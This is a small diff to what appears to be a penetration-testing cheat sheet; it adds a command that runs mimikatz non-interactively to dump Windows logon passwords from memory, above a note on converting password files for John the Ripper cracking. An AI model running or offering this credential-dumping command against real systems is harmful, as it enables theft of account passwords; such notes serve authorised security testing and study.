@@ -1,3 +1,8 @@
+# Get
+Run mimikatz non-interactively:
+```powershell
+.\mimikatz.exe privilege::debug sekurlsa::logonpasswords exit
+```
 # Convert
 passwd -> john
 ```
